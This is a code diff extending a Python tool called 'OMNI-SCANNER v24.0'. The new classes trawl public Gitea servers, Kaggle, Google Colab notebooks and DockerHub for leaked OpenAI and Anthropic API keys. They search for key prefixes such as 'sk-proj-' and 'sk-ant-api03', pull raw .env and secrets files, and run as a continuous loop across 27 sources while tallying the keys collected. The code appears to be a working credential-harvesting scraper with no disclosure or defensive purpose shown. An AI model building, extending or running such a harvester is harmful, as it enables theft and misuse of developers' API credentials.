+                None, _ddgs_search_in_subprocess, ddg_query, 15, 20.0,
+            )
+        except Exception:
+            return
+
+        tasks: list[Any] = []
+        for r in results:
+            url = r.get("href", r.get("link", ""))
+            body = r.get("body", "")
+            if body:
+                tasks.append(self.process_text(body, url or "kaggle"))
+            if url and "kaggle.com" in url:
+                # Try to get the raw notebook
+                if "/code/" in url:
+                    # Convert to download URL
+                    tasks.append(self._fetch(url))
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=12.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class GiteaInstancesScanner(BaseScanner):
+    """Searches public Gitea/Forgejo instances beyond Codeberg.
+    Many organizations run public Gitea servers with leaked secrets."""
+
+    _INSTANCES: list[str] = [
+        "https://gitea.com",
+        "https://git.disroot.org",
+        "https://git.teknik.io",
+        "https://git.sr.ht",
+        "https://git.mills.io",
+        "https://code.forgejo.org",
+    ]
+
+    _QUERIES: list[str] = [
+        "sk-proj-",
+        "sk-ant-api03",
+        "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY",
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[Gitea] Searching {len(self._INSTANCES)} public Gitea instances...{Style.RESET_ALL}")
+        for instance in self._INSTANCES:
+            for query in self._QUERIES:
+                await self._search(instance, query)
+                await asyncio.sleep(1.5)
+
+    async def _search(self, instance: str, query: str) -> None:
+        host = instance.split("//")[-1]
+        print(f"{Fore.BLUE}[Gitea] {host}: {query}{Style.RESET_ALL}")
+        params = {"q": query, "page": "1", "limit": "20"}
+        result = await self.http.get(
+            f"{instance}/api/v1/repos/search",
+            params=params,
+            timeout=10.0,
+        )
+        if result is None or result.status != 200:
+            return
+
+        data = result.json_data or {}
+        repos = data.get("data", data) if isinstance(data, dict) else data
+        if not repos or not isinstance(repos, list):
+            return
+
+        tasks: list[Any] = []
+        for repo in repos:
+            full_name = repo.get("full_name", "")
+            default_branch = repo.get("default_branch", "main")
+            if full_name:
+                for fname in [".env", ".env.local", "config.json", "secrets.py",
+                              "docker-compose.yml", ".env.production"]:
+                    raw = f"{instance}/{full_name}/raw/branch/{default_branch}/{fname}"
+                    tasks.append(self._fetch(raw))
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=8.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class GoogleColabScanner(BaseScanner):
+    """Searches for Google Colab notebooks with leaked API keys.
+    Colab notebooks are public by default and often contain hardcoded keys."""
+
+    _QUERIES: list[str] = [
+        'site:colab.research.google.com "sk-proj-"',
+        'site:colab.research.google.com "OPENAI_API_KEY"',
+        'site:colab.research.google.com "sk-ant-api"',
+        'site:colab.research.google.com "ANTHROPIC_API_KEY"',
+        'site:colab.research.google.com "openai.api_key"',
+        'site:colab.research.google.com "anthropic" "api_key"',
+        'site:colab.research.google.com "client = OpenAI"',
+    ]
+
+    async def run(self) -> None:
+        if not DDGS:
+            return
+        print(f"{Fore.CYAN}[Colab] Searching Google Colab notebooks...{Style.RESET_ALL}")
+        for query in self._QUERIES:
+            await self._search(query)
+            await asyncio.sleep(2.0)
+
+    async def _search(self, query: str) -> None:
+        print(f"{Fore.BLUE}[Colab] {query[:55]}{Style.RESET_ALL}")
+        try:
+            results = await asyncio.get_event_loop().run_in_executor(
+                None, _ddgs_search_in_subprocess, query, 20, 25.0,
+            )
+        except Exception:
+            return
+
+        tasks: list[Any] = []
+        for r in results:
+            url = r.get("href", r.get("link", ""))
+            body = r.get("body", "")
+            if body:
+                tasks.append(self.process_text(body, url or "colab"))
+            if url and "colab.research.google.com" in url:
+                # Try to get the notebook JSON
+                nb_id = ""
+                if "fileId=" in url:
+                    nb_id = url.split("fileId=")[-1].split("&")[0].split("#")[0]
+                elif "/drive/" in url:
+                    nb_id = url.split("/drive/")[-1].split("?")[0].split("#")[0]
+                if nb_id:
+                    export_url = f"https://docs.google.com/uc?export=download&id={nb_id}"
+                    tasks.append(self._fetch(export_url))
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=12.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class DockerHubScanner(BaseScanner):
+    """Searches DockerHub for images with leaked API keys in Dockerfiles
+    and environment variables."""
+
+    _QUERIES: list[str] = [
+        "openai",
+        "chatgpt",
+        "anthropic",
+        "claude-api",
+        "gpt-bot",
+        "langchain",
+        "ai-proxy",
+        "llm-gateway",
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[DockerHub] Searching Docker images...{Style.RESET_ALL}")
+        for query in self._QUERIES:
+            await self._search(query)
+            await asyncio.sleep(2.0)
+
+    async def _search(self, query: str) -> None:
+        print(f"{Fore.BLUE}[DockerHub] Search: {query}{Style.RESET_ALL}")
+        params = {"query": query, "page_size": "25", "ordering": "-pull_count"}
+        result = await self.http.get(
+            "https://hub.docker.com/api/content/v1/products/search",
+            params=params,
+            headers={"Search-Version": "v3"},
+            timeout=15.0,
+        )
+        if result is None or result.status != 200:
+            # Fallback: Docker Hub v2 search
+            result = await self.http.get(
+                f"https://hub.docker.com/v2/search/repositories/?query={query}&page_size=25",
+                timeout=15.0,
+            )
+            if result is None or result.status != 200:
+                return
+
+        data = result.json_data or {}
+        results_list = data.get("summaries", data.get("results", []))
+        tasks: list[Any] = []
+        for item in results_list:
+            slug = item.get("slug", item.get("repo_name", ""))
+            name = item.get("name", "")
+            repo = slug or name
+            if repo:
+                # Check Dockerfile and description
+                tasks.append(self._check_repo(repo))
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _check_repo(self, repo: str) -> None:
+        # Fetch repo info which includes full_description (often has env vars)
+        if "/" not in repo:
+            repo = f"library/{repo}"
+        result = await self.http.get(
+            f"https://hub.docker.com/v2/repositories/{repo}/",
+            timeout=10.0,
+        )
+        if result is None or result.status != 200:
+            return
+        data = result.json_data or {}
+        desc = data.get("full_description", "")
+        if desc:
+            await self.process_text(desc, f"dockerhub:{repo}")
+
+        # Check Dockerfile tag
+        result2 = await self.http.get(
+            f"https://hub.docker.com/v2/repositories/{repo}/dockerfile/",
+            timeout=10.0,
+        )
+        if result2 is not None and result2.status == 200:
+            df_data = result2.json_data or {}
+            contents = df_data.get("contents", "")
+            if contents:
+                await self.process_text(contents, f"dockerhub:{repo}/Dockerfile")
+
+
 # ============================================================================
 # SECTION 11: MAIN
 # ============================================================================
@@ -2462,7 +3416,7 @@ async def main() -> None:
         if not os.path.exists(f_name):
             open(f_name, "w", encoding="utf-8").close()
 
-    print(f"{Fore.GREEN}=== OMNI-SCANNER v20.0 (grep.app + Pastebin + Replit + Split Tokens) ==={Style.RESET_ALL}")
+    print(f"{Fore.GREEN}=== OMNI-SCANNER v24.0 (27 src + Telegram + URL cache + placeholder filter + fresh dorks) ==={Style.RESET_ALL}")
 
     # Show existing keys statistics
     _print_existing_keys_stats()
@@ -2536,8 +3490,13 @@ async def main() -> None:
                 await asyncio.sleep(10)
 
                 # 4. Commits search (lighter)
-                print(f"{Fore.CYAN}[System] Phase 4/4: Commits Search{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}[System] Phase 4/5: Commits Search{Style.RESET_ALL}")
                 await GitHubCommitsScanner(deepscan_pool, *common).run()
+                await asyncio.sleep(10)
+
+                # 5. Newly created AI repos (separate rate limit bucket)
+                print(f"{Fore.CYAN}[System] Phase 5/5: New AI Repo Search{Style.RESET_ALL}")
+                await GitHubRepoScanner(deepscan_pool, *common).run()
 
                 print(f"{Fore.MAGENTA}[System] GitHub deep scan finished. Sleeping {SLOW_LOOP_INTERVAL}s...{Style.RESET_ALL}")
             except Exception as e:
@@ -2559,13 +3518,24 @@ async def main() -> None:
 
     # --- 3. OSINT LOOP (Runs even if GitHub is banned / no tokens) ---
     async def osint_loop():
-        print(f"{Fore.CYAN}[System] OSINT (Web/NPM/HF/Sourcegraph/grep.app/Pastebin/Replit) loop started.{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[System] OSINT (27 sources, no GitHub tokens needed) loop started.{Style.RESET_ALL}")
         while True:
             try:
                 # None of these require GitHub tokens
                 scanners = [
                     GrepAppScanner(*common),
                     SourcegraphScanner(*common),
+                    SearchCodeScanner(*common),
+                    PostmanScanner(*common),
+                    BitbucketScanner(*common),
+                    CodebergScanner(*common),
+                    GiteaInstancesScanner(*common),
+                    WaybackScanner(*common),
+                    StackOverflowScanner(*common),
+                    KaggleScanner(*common),
+                    GoogleColabScanner(*common),
+                    DockerHubScanner(*common),
+                    MultiplePasteScanner(*common),
                     PastebinRecentScanner(*common),
                     ReplitSearchScanner(*common),
                     NpmScanner(PACKAGE_QUERIES, *common),
